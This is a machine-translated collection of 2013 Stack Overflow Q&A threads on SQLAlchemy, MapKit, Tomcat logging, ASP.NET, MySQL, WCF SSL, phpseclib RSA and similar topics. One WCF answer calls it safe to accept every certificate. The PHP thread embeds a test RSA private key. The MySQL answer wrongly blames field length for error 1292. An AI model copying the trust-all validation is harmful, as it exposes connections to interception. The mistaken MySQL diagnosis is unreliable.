> 时间：2013-04-01T19:58:27.353

在最一般的意义上，Session 建立了与数据库的所有对话，并为您在其生命周期内加载或与之关联的所有对象代表了一个“保存区”。它提供了获取 Query 对象的入口点，该对象使用 Session 对象的当前数据库连接向数据库发送查询，将结果行填充到对象中，然后存储在 Session 中，在称为 Identity Map 的结构内 - 一种维护数据结构每个对象的唯一副本，其中“唯一”表示“只有一个具有特定主键的对象”。

试着`pprint`看看里面有什么；

```
import pprint
pprint.pprint(my_session) 
```

这是故事的其余部分：http: [//docs.sqlalchemy.org/ru/latest/orm/session.html](http://docs.sqlalchemy.org/ru/latest/orm/session.html)

# xcode - 在 MKMapKit 中自定义注释引脚

> ID：15750558
> 
> 赞同：0
> 
> 时间：2013-04-01T19:44:26.137
> 
> 标签：xcode, map, annotations, mkmapview

我正在尝试在我的地图上自定义图钉

`-(MKAnnotationView *)mapView:(MKMapView *)mapView viewForAnnotation:(id)annotation`ColonnineController 类中的方法

但它不起作用，我该如何解决？谢谢你！

[这是源代码](http://dl.dropbox.com/u/4712155/iBo.zip)

这里的方法：

```
-(MKAnnotationView *)mapView:(MKMapView *)mapView viewForAnnotation:(id)annotation{
    static NSString * parkingAnnotationIdentifier = @"ParkingAnnotationIdentifier";

    if([ annotation isKindOfClass:[DisplayMap class]]){
        MKAnnotationView *annotationView=[mapView dequeueReusableAnnotationViewWithIdentifier:parkingAnnotationIdentifier];
        if(!annotationView){
            annotationView=[[MKAnnotationView alloc] initWithAnnotation:annotation reuseIdentifier:parkingAnnotationIdentifier];
            annotationView.image=[UIImage imageNamed:@"parkingIcon.png"];
        }
        return annotationView;
    }
    return nil;
} 
```

# fortran - Fortran 对变量的引用

> ID：15750562
> 
> 赞同：0
> 
> 时间：2013-04-01T19:44:38.470
> 
> 标签：fortran

我对 Fortran 非常陌生，所以请原谅对这个问题的任何无知。无论如何，我正在优化一些模拟软件。

为了更清楚，我正在编辑的子程序在开始时初始化了一些静态变量，无论开始条件是什么，它们都应该是相同的。

问题是我有另一段代码在它的每个时间步骤中调用这个子例程，重新初始化数百个变量，这应该保持不变。为了解决这个问题，我创建了一个派生类型，其中包括程序中其他模块的所有这些变量，并且我正在编辑软件以初始化派生类型变量而不是模块变量，以便我可以跨不同的时间步进行引用。

我的问题是，我是否在做不必要的工作。如果我只是将所有初始化内容放入主程序之外的子例程中，然后在编译时将它们链接起来，那么所有变量是否会在函数调用中保留它们的值。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T21:08:47.853

如果你有一个变量应该被初始化一次并且永远不会改变，给它参数属性：

`real, parameter :: pi = 3.141592`

编译器会将“变量”视为无法更改的常量。如果您错误地尝试更改此类变量，编译器会通知您您的错误。

这回答了你的问题了吗？

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2013-04-02T20:05:54.497

我不知道你在做什么，但 FORTRAN 是一个 3GL，它通过引用传递参数。如果您希望主程序中的变量位于子程序中，则需要将其放在一个公共块中。COMMON 块就像 C 中的全局变量。

# java - 使用JULI在tomcat 7中的应用程序特定登录？

> ID：15750564
> 
> 赞同：3
> 
> 时间：2013-04-01T19:44:46.993
> 
> 标签：java, tomcat, logging

我在 tomcat 7 中使用 java 系统登录，但没有日志语句写入日志。我已将此文件添加到我的 WEB-INF/classes 中。日志文件“new-xyz-test”被创建（所以我至少有一些配置正确）但它是空的 - 没有日志语句被打印到它。

```
handlers=java.util.logging.ConsoleHandler, org.apache.juli.FileHandler

org.apache.juli.FileHandler.level=ALL
org.apache.juli.FileHandler.directory=${catalina.base}/logs
org.apache.juli.FileHandler.prefix=new-xyz-test-

java.util.logging.ConsoleHandler.level=ALL
java.util.logging.ConsoleHandler.formatter = java.util.logging.SimpleFormatter

com.xyz.level=ALL
com.xyz.handlers=org.apache.juli.FileHandler 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-01T23:41:17.960

要在 Web 应用程序中配置 JULI，您需要`logging.properties`在目录中有一个文件`WEB-INF/classes`。如果您使用默认处理程序，您可能会丢失消息。您需要在文件中为处理程序指定前缀。

```
handlers=1FILE.org.apache.juli.FileHandler, java.util.logging.ConsoleHandler
.handlers=java.util.logging.ConsoleHandler

1FILE.org.apache.juli.FileHandler.level=FINEST
1FILE.org.apache.juli.FileHandler.directory=/app-logs
1FILE.org.apache.juli.FileHandler.prefix=file-1

java.util.logging.ConsoleHandler.level=FINE
java.util.logging.ConsoleHandler.formatter=java.util.logging.SimpleFormatter

com.xyz.level=INFO
com.xyz.handlers=1FILE.org.apache.juli.FileHandler

com.abc.level=INFO
com.abc.handlers=java.util.logging.ConsoleHandler 
```

处理程序前缀（例如`1FILE.`）以数字开头，然后是任意字符串，并以句点 (.) 结束。

*   [*在 Tomcat*](http://tomcat.apache.org/tomcat-7.0-doc/logging.html)中查看更多信息[](http://tomcat.apache.org/tomcat-7.0-doc/logging.html)

 ** * *

### JVM 中的参数

如果您没有从`startup.sh`或运行 Tomcat，则`startup.bat`需要指定：

1.  Tomcat通用的位置`logging.properties`（在Tomcat的`conf`目录下）
2.  经理`org.apache.juli.ClassLoaderLogManager`。这很重要，因为它允许您为每个 Web 应用程序配置不同的登录选项。默认情况下，一个JVM进程只能有一个配置文件。），

类似于下一个（我正在使用eclipse）：

```
-Djava.util.logging.config.file="C:\Users\Paul\workspaces\utils\.metadata\.plugins\org.eclipse.wst.server.core\tmp0\conf\logging.properties" -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager 
```

默认情况下，`java.util.logging`读取包含在 JDK 或 JRE 中的文件，例如：

```
"C:\Software\jdk1.7.0_17\jre\lib\logging.properties" 
```

*   [*在 Eclipse 中设置 Tomcat 堆大小（JVM 堆）*](http://viralpatel.net/blogs/setting-tomcat-heap-size-jvm-heap-eclipse/)，了解如何在 VM 中添加参数

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-13T13:04:59.403

你确定你写的是正确的记录器，即`Logger.getLogger("com.xyz")`？

我认为您在 logging.properties`com.xyz.level=ALL com.xyz.handlers=org.apache.juli.FileHandler`中写入时可能会出错：如果您实际写入 logger `Logger.getLogger(com.xyz.YourClass.class)`，那是因为在日志记录属性文件中您应该写下您的情况的记录器名称`com.xyz.YourClass`*

# javascript - 从后面的代码调用 javascript 的函数

> ID：15750569
> 
> 赞同：3
> 
> 时间：2013-04-01T19:45:09.093
> 
> 标签：javascript, asp.net

我使用下面的代码从后面的代码调用 javascript 的函数，但不调用函数

```
//C#
Page.ClientScript.RegisterStartupScript(this.GetType(), "close panel", "CloseFunction()", true);

//javascript
function CloseFunction() {
            alert("call");
            } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T19:49:34.590

应该是真的。

```
Page.ClientScript.RegisterStartupScript(this.GetType(), "close panel", "CloseFunction()", 
true); 
```

**更新链接：**

[ClientScriptManager.RegisterStartupScript 方法](http://msdn.microsoft.com/en-us/library/system.web.ui.clientscriptmanager.registerstartupscript.aspx)

**一个布尔值，指示是否添加脚本标签。**

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T19:49:37.040

C# 代码上的最后一个参数应该是`true`，而不是`false`. 这将`<script>`在脚本周围添加标签，脚本将执行它。否则，它只会将文本打印到页面上。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-09-19T11:25:24.940

不知道其他答案，我尝试了所有但没有为我工作。

如果有人无法处理这些问题，请尝试以下操作：

```
System.Web.UI.ScriptManager.RegisterClientScriptBlock(Page, typeof(Page), "Script", "MyJavascriptFunction();", true); 
```

参考。[这个suresh先生](http://www.aspdotnet-suresh.com/2010/08/calling-javascript-function-from.html)链接

# sql-server - 集成服务的 SQL Server 2012 企业版设置

> ID：15750570
> 
> 赞同：0
> 
> 时间：2013-04-01T19:45:11.060
> 
> 标签：sql-server, ssis

我刚刚在我的机器上设置了 Microsoft SQL Server 2012 Service Pack 1 Enterprise Edition，并检查了是否安装了报告服务以及集成服务包。

查看安装后的发现报告：![发现报告](https://i.imgur.com/MvR8JTr.png)

我启用了以下端口：2383、2382、4022、1433、1434、135、80、443

我尝试启动/连接到集成服务是徒劳的。当我打开 Management Studio 时，我选择了 Integration Services 进行连接，但我收到以下消息（屏幕截图）：![错误截图](https://i.imgur.com/B9x55Ve.png)

有人可以指出我正确的方向，以便我可以开始使用 SSIS 吗？

**更多信息：** 我有 2 个物理驱动器 - SSD (C:) 和 HDD (D:)。SQL Server 安装在 D: 上，Windows 7 在 C: 上运行。

我的用户名属于或属于管理员组。管理员帐户被禁用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-03T06:55:41.783

这看起来像可怕的 DCOM 权限问题，参考：

[http://sqlbuzz.wordpress.com/2011/12/07/connecting-to-the-integration-services-service-on-the-computer-mirrorstand-failed-with-the-following-error-access-is-拒绝/](http://sqlbuzz.wordpress.com/2011/12/07/connecting-to-the-integration-services-service-on-the-computer-mirrorstand-failed-with-the-following-error-access-is-denied/)

祝你好运！

# c# - Facebook Graph API 照片上传：底层连接已关闭：接收时发生意外错误

> ID：15750571
> 
> 赞同：0
> 
> 时间：2013-04-01T19:45:11.520
> 
> 标签：c#, facebook, facebook-graph-api

（不确定在哪个 Stack 站点上发布此内容。请指出正确的方向）

我在将照片上传到 Facebook Graph API 时遇到问题，我收到错误消息：

“底层连接已关闭：接收时发生意外错误。”

或者

“底层连接已关闭：发送时发生意外错误。” “无法将数据写入传输连接：现有连接被远程主机强行关闭。”

我相信这是 Graph API 本身的问题，而不是我最终触发的问题。还有其他人遇到这个问题吗？我可以提供哪些详细信息，以便我们就这个问题进行有意义的对话？

该应用程序采用 C# 4.0 构建，具有大型社交媒体管理工具的功能。照片发布是一个小而重要的功能，因此错误率的增加令人担忧。

几年来，我们已经集成了 Facebook/GraphAPI 以支持图片上传、照片发布等。这个特殊的错误过去曾出现过，但我无法找到合适的解决方案。有用于重新尝试 API 调用的自动重新尝试逻辑，但在涉及照片上传时禁用。（我们已经看到太多 Graph API 返回错误但实际上上传图像的情况，导致我们重新尝试并上传了多个图像）。

Facebook 错误报告： [https ://developers.facebook.com/bugs/438368212913456](https://developers.facebook.com/bugs/438368212913456)

# mysql - 插入文本时出现 MySQL 错误 1292

> ID：15750572
> 
> 赞同：1
> 
> 时间：2013-04-01T19:45:16.703
> 
> 标签：mysql, sql, insert, mysql-error-1292

我正在尝试将 2 个字段的组合插入一个字段，每次执行此操作时都会收到有关截断数据的错误。

编码：

```
insert into sharppatentdb.Inventor (InventorFull)
select InventorFirst + " " + InventorLast 
from sharppatentdb.inventorsource; 
```

错误：

> 错误代码：1292。截断不正确的 DOUBLE 值：“ `Rossi-Wolter`”

所有源字段都是`VARCHAR(64)`InventorFull 字段是`VARCHAR(511)`我做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T19:48:56.333

所以问题是`InventorFull`需要`511`基于这个语句的字符：

> 所有字段都是 VARCHAR(255)

因为在某个地方混合了两个字段的连接`InventorFirst`，单个空格，并且`InventorLast`大于 255 个字符。当您为连接值构建字段时，它们需要是两个字段以及任何其他字符的组合大小。

为了更清楚地描述您的`InventorFull`字段需要是`511`字符的原因 - 您的两个字段是`255`字符***，并且***您在两者之间添加了一个字符：

```
255 + 255 + 1 = 511 
```

此外，如评论中所示，值得注意的是，这不适用于***低于***5.0.3 的 MySQL 版本。

# mysql - sql排序依据和分组依据

> ID：15750573
> 
> 赞同：0
> 
> 时间：2013-04-01T19:45:19.503
> 
> 标签：mysql, sql, sql-order-by

我对 sql 请求有一些问题：

```
SELECT DISTINCT b . * 
FROM follow a 
INNER JOIN position b 
  ON a.user_id = b.follow_id 
INNER JOIN referent_follow c 
  ON a.user_id = c.follow 
WHERE c.referent = 14 
GROUP BY b.follow_id 
ORDER BY b.date DESC 
```

这个请求有效。我添加了一个 group by 因为我不希望结果中有相同的 follow_id。这工作我在响应中从来没有相同的 follow_id 但是对于每个 follow_id 请求返回第一个，我想得到最后一个（按日期顺序排序）

在此末尾添加按日期顺序排列的顺序，此顺序是最终结果，而不是要选择的 follow_id

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T19:49:30.393

如果要返回`max(date)`，则可以使用子查询：

```
SELECT b.* 
FROM follow a 
INNER JOIN position b 
  ON a.user_id = b.follow_id 
INNER JOIN
(
    select max(date) MaxDate, follow_id
    from position
    group by follow_id
) b1
    on b.follow_id = b1.follow_id
    and b.date = b1.MaxDate
INNER JOIN referent_follow c 
  ON a.user_id = c.follow 
WHERE c.referent = 14 
ORDER BY b.date DESC 
```

子查询将返回`max(date)`for each `follow_id`，然后您将该结果连接回`position`表以返回表中的剩余数据`position`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T19:56:43.417

像这样的东西会起作用。

```
select JustTheFieldsYouNeed, max(datefield) maxdate
from follow a join position b a.user_id = b.follow_id 
join referent_follow c on a.user_id = c.follow 
where c.referent = 14 
group by JustTheFieldsYouNeed 
```

如果您确实需要位置的每个字段，请输入它们。

# javascript - JS - 素数脚本 - 解释

> ID：15750574
> 
> 赞同：0
> 
> 时间：2013-04-01T19:45:21.923
> 
> 标签：javascript, numbers

我正在学习 JS，偶然发现了一个输出素数 < 100 的脚本。但我不确定我是否完全理解它是如何工作的。如果有人能解释一下，我会很高兴。:)

所以这里是：

```
for (var counter = 0; counter <= 100; counter++)
{
    for (var i = 2; i <= counter-1; i++)
        if (counter%i === 0) break;
    if(i === counter)
        console.log(counter);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T19:55:58.673

根据定义，素数只能被它们自己和 1 整除。外层`for var(counter = 0; ...)`循环遍历从 0 到 100 的数字。然后内层循环`for (var i = 2; ...)`尝试将外层数除以 2 和计数器值之间的每个数字。如果其中任何一个除数而没有余数，则循环被打破。就是这样`if (counter%i === 0) break;`。如果我们跳出循环并且`i === counter`，它是一个素数，否则它不是 - 根据定义。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T19:57:46.933

```
/* For every number from 0 to 100, do the following: */
for (var counter = 0; counter <= 100; counter++)
{
    /* Loop through values from 2 to 1 before the counter. */
    for (var i = 2; i <= counter-1; i++) {
        /* if the remainder of dividing counter by the current value of `i` is zero,
         * we know we don't have a prime, so break out of the loop:
         */
        if (counter%i === 0) break; 
    }
    /* If the loop completed and `i` is equal to the counter, that means counter is not
     * divisible by anything except for 1 and itself, making it prime
     */
    if(i === counter)
        console.log(counter);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T19:57:29.310

我不确定你知道多少 JavaScript，所以其中一些可能是非常基础的。

首先，请记住质数是其唯一因数为 1 和自身的数。

所以第一行说它从 0 循环到 100，`counter`作为变量保存这个数字。

下一行`for (var i = 2; i <= counter-1; i++)`从 2 循环到`counter`-1（注意它不包括 1 和`counter`）并用于`i`保存这个数字。

接下来，`if (counter%i === 0) break;`测试是否`counter`可被 整除`i`：余数运算符`%`返回余数（如长除法），例如`11 % 3`将返回`2`因为 11 除以 3 得到 3 余数 2；如果余数`counter % i`是`0`(`===`是比 更严格的等式`==`，但这完全是一个不同的答案) 这意味着它`counter`可以被整除`i`，因此不是素数。该`break`语句告诉它退出最内层循环（即，循环结束`i`），因此程序递增`counter`并继续。

如果前一行没有因为 的任何值而中断`i`，`counter`则为素数——具体而言，在循环体的末尾，`i`递增（现在等于`counter`），语句的`i <= counter-1`计算结果为 false，循环结束。所以现在`i === counter`是真的，所以`console.log(counter)`在控制台中显示这个值。

# wcf - System.ServiceModel.Security.SecurityNegotiationException: Could not establish trust relationship for the SSL/TLS secure channel with authority

> ID：15750575
> 
> 赞同：2
> 
> 时间：2013-04-01T19:45:30.293
> 
> 标签：wcf, ssl

I am getting below error while trying to call webservice through UAT environment. However on my local it is working properly. I see some comment as it might be due to dummy cert but could not get the answer so posting it here . Also i am beginner to WCF . Please let me know how can i fix this .

what will be impact on production if i trust all by

```
//Trust all certificates
        System.Net.ServicePointManager.ServerCertificateValidationCallback =
            ((sender, certificate, chain, sslPolicyErrors) => true); 
```

error says - System.ServiceModel.Security.SecurityNegotiationException: Could not establish trust relationship for the SSL/TLS secure channel with authority . ---> System.Net.WebException: The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel. ---> System.Security.Authentication.AuthenticationException: The remote certificate is invalid according to the validation procedure.

binding is

```
 <basicHttpBinding>
    <binding name="GLEditServiceSOAP" closeTimeout="00:01:00" openTimeout="00:01:00"
      receiveTimeout="00:10:00" sendTimeout="00:01:00" allowCookies="false"
      bypassProxyOnLocal="false" hostNameComparisonMode="StrongWildcard"
      maxBufferSize="65536" maxBufferPoolSize="524288" maxReceivedMessageSize="65536"
      messageEncoding="Text" textEncoding="utf-8" transferMode="Buffered"
      useDefaultWebProxy="true">
      <readerQuotas maxDepth="32" maxStringContentLength="8192" maxArrayLength="16384"
        maxBytesPerRead="4096" maxNameTableCharCount="16384" />
      <security mode="Transport">
        <transport clientCredentialType="None" proxyCredentialType="None"
          realm="" />
        <message clientCredentialType="UserName" algorithmSuite="Default" />
      </security>
    </binding> 
```

also wonder how it is working on my localhost.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-05-21T10:51:53.270

[你可以在这里](http://blog.randomdust.com/index.php/2010/10/could-not-establish-trust-relationship-for-the-ssl-tls-secure-channel/)参考这篇文章。如帖子中所述，如果您使用 SSL 信任 URL，或者如果所有组件都托管在您公司的 Intranet 中，则在证书验证中始终返回 True 是安全的。

# asp.net-mvc - 无法为视图设置布局页面

> ID：15750580
> 
> 赞同：0
> 
> 时间：2013-04-01T19:45:33.357
> 
> 标签：asp.net-mvc, asp.net-mvc-4

我创建了一个 helloWorldController，为此我创建了一个索引方法

![在此处输入图像描述](https://i.stack.imgur.com/WgGzk.jpg)

这是为我生成的视图代码

```
 @{
    ViewBag.Title = "Index";
    Layout = "~/Views/Shared/_Layout.cshtml";
}

<h2>Index</h2> 
```

我的 _layout 页面是默认的 ASP.NET MVC 4 布局。但是我仍然得到空白页，其中包含从 Index 方法返回的字符串。

如何为视图启用 _Layout 页面？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T20:15:27.527

如果该屏幕截图是您的控制器的实际代码，您需要`ActionResult`为每个操作方法返回而不是字符串，例如

```
public ActionResult Index()
{
    return View();
} 
```

如果在您的或文件夹中`View()`调用了视图，则返回值将起作用。惯例是，对于与该控制器特别相关的所有视图，您都有一个与控制器同名的特定文件夹 - 在您的情况下`Index.cshtml``Views\HelloWorld``Views\Shared``HelloWorld`

# android - $.ajax breaks in mobile browser

> ID：15750582
> 
> 赞同：1
> 
> 时间：2013-04-01T19:45:41.733
> 
> 标签：android, jquery, python, google-chrome

I have created a small `python` app to show the [demo](https://github.com/kracekumar/test-flask).

## HTML

```
<html>
<body>
    <button id="button"> Click for JSON Response </button>
    <div id="update"></div>
<script src="{{url_for('static', filename='jquery-1.8.3.js')}}"></script>
<script type="text/javascript">
    $("#button").on('click', function(e){
        $.ajax({
            type: "POST",
            url: "http://localhost:8888/json",
            success: function(msg){
                $("#update").html(msg['msg']);
            }
        });
    });
</script> 
```

Clicking on the button yields `msg` from [server](https://github.com/kracekumar/test-flask/blob/master/app.py#L12). But on mobile, following error is raised.

```
POST http://localhost:8888/json  jquery-1.8.3.js:8434
send jquery-1.8.3.js:8434
jQuery.extend.ajax jquery-1.8.3.js:7986
(anonymous function) 192.168.0.101:8
jQuery.event.dispatch jquery-1.8.3.js:3058
elemData.handle.eventHandle 
```

`$.ajax` submits fails in chrome android mobile browser in android 4.2.2\.

## Edit

1.`adb forward tcp:9222 localabstract:chrome_devtools_remote` Then accessed via ip address of the machine with portno(8888) and console log was captured by visiting `http://localhost:9222` in laptop.
2\. After adding console.log(err) in $.ajax, error message in console is

```
Object {readyState: 0, setRequestHeader: function, getAllResponseHeaders: function,      getResponseHeader: function, overrideMimeType: function…}
abort: function ( statusText ) {
always: function () {
complete: function () {
done: function () {
error: function () {
fail: function () {
getAllResponseHeaders: function () {
getResponseHeader: function ( key ) {
overrideMimeType: function ( type ) {
pipe: function ( /* fnDone, fnFail, fnProgress */ ) {
progress: function () {
promise: function ( obj ) {
readyState: 0
responseText: ""
setRequestHeader: function ( name, value ) {
state: function () {
status: 0
statusCode: function ( map ) {
statusText: "error"
success: function () {
then: function ( /* fnDone, fnFail, fnProgress */ ) {
__proto__: Object 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-29T17:45:48.830

If you are tunneling your request data through you need to go to Chrome Canary, go to chrome://experiments then "Enable Dev Tools experiements"

![Enable Devtools Experiments](https://i.stack.imgur.com/H5RD8.png)

then in dev tools go to the settings

![Settings](https://i.stack.imgur.com/CPKFO.png)

Go to Experiments and enable port forwarding.

![enter image description here](https://i.stack.imgur.com/QslVP.png)

Refresh.

Then go to chrome://inspect (with your device plugged in) and go to devtools for the page.

And then select "Port Forwarding"

![port forwarding](https://i.stack.imgur.com/FRmMA.png)

And add the maps of "device ports" to your testing server ip address and port.

# c# - 自定义控制字符串属性 C#

> ID：15750586
> 
> 赞同：-2
> 
> 时间：2013-04-01T19:45:48.910
> 
> 标签：c#

所以我正在为我的程序制作一个自定义控件。我去添加一个字符串属性，但是当我尝试更改它时，C# 崩溃了。这是我正在使用的代码

```
private string series = "None";
[Description("Tells What the Series is")]
[Category("Element")]
[DefaultValue("None")]
public string Series
{
    get { return series; }
    set { Series = value; }
} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-01T19:47:05.980

您正在递归设置它。

```
private string series = "None";
[Description("Tells What the Series is")]
[Category("Element")]
[DefaultValue("None")]
public string Series
{
   get { return series; }
   set { series = value; }  // notice series not Series
} 
```

我可以建议使用自动属性吗？

```
[Description("Tells What the Series is")]
[Category("Element")]
[DefaultValue("None")]
public string Series
{
    get; set;
} 
```

您必须在构造函数中初始化该值。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-01T19:47:09.080

您正在尝试在属性 `Series`的设置器中递归地设置属性。这将导致一个`StackOverflowException`.

```
set { series = value; } 
```

是你想要的。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-01T19:47:26.953

Yoy 在您的应用程序中有一个无限循环，因此我猜它会因 stackoverflow 错误而崩溃。

```
 set { Series = value; } 
```

应该

```
 set { series = value; } 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-04-01T19:47:34.920

您试图在“集合”中设置属性值本身，从而创建无限递归。

改变

```
set { Series = value; } 
```

到

```
set { series = value; } 
```

（小写 s）。

# php - 在 PHP 中使用 phpseclib 的 RSA 问题

> ID：15750587
> 
> 赞同：2
> 
> 时间：2013-04-01T19:45:52.867
> 
> 标签：php, encryption, rsa, phpseclib

我正在尝试在 phpseclib 中使用 RSA 实现，我认为在函数中执行一次代码并重新使用该函数会更容易。当我尝试向代码发送短信时，我收到一条错误消息“解密错误”测试也让我意识到每次代码运行时密文都是不同的，所以我显然在那里做错了！

* * *

函数的代码是：

```
require_once "Crypt/RSA.php";
require_once "Crypt/AES.php";

//Function for encrypting with RSA
function rsa_encrypt($string, $public_key)
{
    //Create an instance of the RSA cypher and load the key into it
    $cipher = new Crypt_RSA();
    $cipher->loadKey($public_key);
    //Set the encryption mode
    $cipher->setEncryptionMode(CRYPT_RSA_ENCRYPTION_PKCS1);
    //Return the encrypted version
    return base64_encode($cipher->encrypt($string));
}

//Function for decrypting with RSA 
function rsa_decrypt($string, $private_key)
{
    //Create an instance of the RSA cypher and load the key into it
    $cipher = new Crypt_RSA();
    $cipher->loadKey($private_key);
    //Set the encryption mode
    $cipher->setEncryptionMode(CRYPT_RSA_ENCRYPTION_PKCS1);
    //Return the decrypted version
    return $cipher->decrypt($string);
} 
```

* * *

我尝试使用以下方法对其进行测试：（密钥仅用于测试，这就是其硬编码的原因）。正是在这里，每次运行代码时，$ciphertext 的值每次都会改变

```
//Private key
$private_key = "-----BEGIN RSA PRIVATE KEY----- MIICXAIBAAKBgQCU+1bLfPmcY7qrF/dTbAtuJlv4R/FVc1WEH9HKU0jQjX/n/db9vz/x0i3te/bK LNEcwUhBu+PWPnOt/qVURG9BUT6RsCRFUn0CyGiUKoy45o9K/mJAHmbrNtrUB6ckrYLF75Y50nUN sBVHUDw8yQymmiOBT1gc/KM5s1xTz44LMwIDAQABAoGAGsiMtAyFu23ac0PdvOuhqm3O/vXAF0Ki zxwBVURfxM6LfiOOcRPe5RSKGTW+Cl7AQVEmMlsa/LtBhLhQ9LNQ5L/4oTmRhCGiZZEmccAdjKsx yMeaxkp+ZHvMxMKQNDgYg1CXqrCrpwwUuMUlA26tfxZ3xSFtFyDTaV9mgDQ1IGECQQCkX9Tum7D1 vQTwbhbYnu7eC4eUOaZeGWSEs2csK7U6vfZ3BzUZW/0tPqcSpQqcNxMtY9TiUsNRj1uM6jX3byp7 AkEA6Ab+wvOTNRtES77OAYG9gHGZZ+iXjQJ/6Z7JehN4p41UbDIf9nNUOLUPL9z5V1uOYnl1CWoo Cw95cdhKXxEAqQJBAIU5Or6tp250ZdVslM27ewSyuY9UblfkIsk/EscFIdzbbDAqwkmsefW6yvTc mU3lgYCPYlKRG8c19tCuX1ENY5MCQAz37x9YW975Ai01ofAFn2DheJCNOINCI4IcROiU1AaRaKmP d6fftFJjFFE5iZovXNr2LOt0yn4rxD7vtuBvY9kCQGyty6YCB6qaD7qXPMhLrLbGajAIWd6ETgxv frK/BJu+buPfDky/g1FhI5R9iMtL1xH0JYLJlaVocU+xSeA9DkY= -----END RSA PRIVATE KEY-----";
//Public key
$public_key = "-----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCU+1bLfPmcY7qrF/dTbAtuJlv4R/FVc1WEH9HK U0jQjX/n/db9vz/x0i3te/bKLNEcwUhBu+PWPnOt/qVURG9BUT6RsCRFUn0CyGiUKoy45o9K/mJA HmbrNtrUB6ckrYLF75Y50nUNsBVHUDw8yQymmiOBT1gc/KM5s1xTz44LMwIDAQAB -----END PUBLIC KEY-----";

//Test out the rsa encryption functions
$plaintext = "This is some plaintext to encrypt";
$ciphertext = rsa_encrypt($plaintext, $public_key);
$decipheredtext = rsa_decrypt($ciphertext, $private_key);

//Echo out results
echo sprintf("<h4>Plaintext for RSA encryption:</h4><p>%s</p><h4>After encryption:</h4><p>%s</p><h4>After decryption:</h4><p>%s</p>", $plaintext, $ciphertext, $decipheredtext); 
```

**编辑：** 示例输出是：

RSA加密明文：

这是我们将加密的一些明文

加密后：

'∼!ˆ_æž¦WýF¦E×9&ùš!´jéÓb÷áåŠ€É7J+Ûªß¯×ŽÈã©¨É£#(÷)ÃX„)÷O'Ë±N@Øv«ÓÌPƒ¹—Âî!a¢¦a&Á½Á ∼ö‰ºŠCðJ«vW{uAåoOÂXäÞ#÷ï`agÏ:OŒ

解密后：

//什么都不返回，这里是空白的

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T19:58:12.533

我认为 GigaWatt 的答案是正确的。至于这个：

> 测试也让我意识到每次代码运行时密文都是不同的，所以我显然在那里做错了！

PKCS#1 填充添加随机字节，因此密文总是不同的。然而，PKCS#1 算法知道明文何时结束以及随机字节何时开始，因此它能够将两者分开并返回您想要的结果。

编辑：在用新行替换键中的空格后，我让它工作了。例如。

```
$private_key = "-----BEGIN RSA PRIVATE KEY-----
MIICXAIBAAKBgQCU+1bLfPmcY7qrF/dTbAtuJlv4R/FVc1WEH9HKU0jQjX/n/db9vz/x0i3te/bK
LNEcwUhBu+PWPnOt/qVURG9BUT6RsCRFUn0CyGiUKoy45o9K/mJAHmbrNtrUB6ckrYLF75Y50nUN
sBVHUDw8yQymmiOBT1gc/KM5s1xTz44LMwIDAQABAoGAGsiMtAyFu23ac0PdvOuhqm3O/vXAF0Ki
zxwBVURfxM6LfiOOcRPe5RSKGTW+Cl7AQVEmMlsa/LtBhLhQ9LNQ5L/4oTmRhCGiZZEmccAdjKsx
yMeaxkp+ZHvMxMKQNDgYg1CXqrCrpwwUuMUlA26tfxZ3xSFtFyDTaV9mgDQ1IGECQQCkX9Tum7D1
vQTwbhbYnu7eC4eUOaZeGWSEs2csK7U6vfZ3BzUZW/0tPqcSpQqcNxMtY9TiUsNRj1uM6jX3byp7
AkEA6Ab+wvOTNRtES77OAYG9gHGZZ+iXjQJ/6Z7JehN4p41UbDIf9nNUOLUPL9z5V1uOYnl1CWoo
Cw95cdhKXxEAqQJBAIU5Or6tp250ZdVslM27ewSyuY9UblfkIsk/EscFIdzbbDAqwkmsefW6yvTc
mU3lgYCPYlKRG8c19tCuX1ENY5MCQAz37x9YW975Ai01ofAFn2DheJCNOINCI4IcROiU1AaRaKmP
d6fftFJjFFE5iZovXNr2LOt0yn4rxD7vtuBvY9kCQGyty6YCB6qaD7qXPMhLrLbGajAIWd6ETgxv
frK/BJu+buPfDky/g1FhI5R9iMtL1xH0JYLJlaVocU+xSeA9DkY=
-----END RSA PRIVATE KEY-----";
//Public key
$public_key = "-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCU+1bLfPmcY7qrF/dTbAtuJlv4R/FVc1WEH9HK
U0jQjX/n/db9vz/x0i3te/bKLNEcwUhBu+PWPnOt/qVURG9BUT6RsCRFUn0CyGiUKoy45o9K/mJA
HmbrNtrUB6ckrYLF75Y50nUNsBVHUDw8yQymmiOBT1gc/KM5s1xTz44LMwIDAQAB
-----END PUBLIC KEY-----"; 
```

# xslt - XSL: Display value if not equal to -1.0000

> ID：15750590
> 
> 赞同：0
> 
> 时间：2013-04-01T19:46:03.823
> 
> 标签：xslt

I currently have a field in my xsl as follows:

```
<s:FineAmount>
<xsl:value-of select="FineAmount" />
